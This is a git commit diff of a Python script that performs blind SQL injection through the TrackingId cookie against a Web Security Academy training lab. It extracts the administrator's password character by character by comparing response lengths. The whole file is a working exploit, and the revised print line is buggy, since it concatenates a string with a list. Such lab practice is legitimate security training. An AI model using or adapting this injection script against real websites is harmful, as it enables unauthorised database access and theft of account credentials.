9d88d5169c93309577c2845dc9fe4d5ec938842b
Rakesh Shinde <shinderakesh.kt@gmail.com>
2023-05-24 22:24:34 +0530

    Added an empty string in array to denote missing character in password string

--- blind_sqlinjection_substring.py
+++ blind_sqlinjection_substring.py
@@ -1,30 +1,34 @@
 import requests
 import string
-url = "https://abc.web-security-academy.net/"
+url = "https://0a9900cb04c87d8681065ca8007a009a.web-security-academy.net/"
 
 s = requests.Session()
-dummp_cookie = "KdFdid7YR4ujQBI4"
+dummp_cookie = "ec7dB3N2hSQjQz7Y"
 numbers = [1,2,3,4,5,6,7,8,9,0]
-alphabets = list(string.ascii_letters)+numbers
+apha_numeric_string = list(string.ascii_letters)+numbers
+query_strings = "".join(apha_numeric_string)
+print ("[+] These are the number of parameters that we are going to test --> " + query_strings)
 extractedpassword = []
 for x in range(1,22):
-    for alpha in alphabets:
+    #print("Currently the extracted password is: " + extractedpassword)
+    for alpha in apha_numeric_string:
         ck  = {
         "TrackingId":dummp_cookie + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {}, 1) = '{}".format(x,alpha)
         }
         req = s.get(url=url,cookies=ck)
         ct_len = req.headers
         l = ct_len["Content-Length"]
-        if (l != '1716'):
+        if (l != '1723'):
             extractedpassword.append(alpha)
             print(ck,l)
             break
+    else:
+        extractedpassword.append("")
 #req = s.get(url=url,cookies=ck)
 
 #print(s.headers)
 #print(req.headers)
 #print(req.text)
-#extracted sample password --> v8lthsfxguakabans
-print(extractedpassword)
-print(''.join(extractedpassword))
+#extracted password --> v8lthsfxguakabans
+print("Cracked password --> " + extractedpassword)
 s.close()
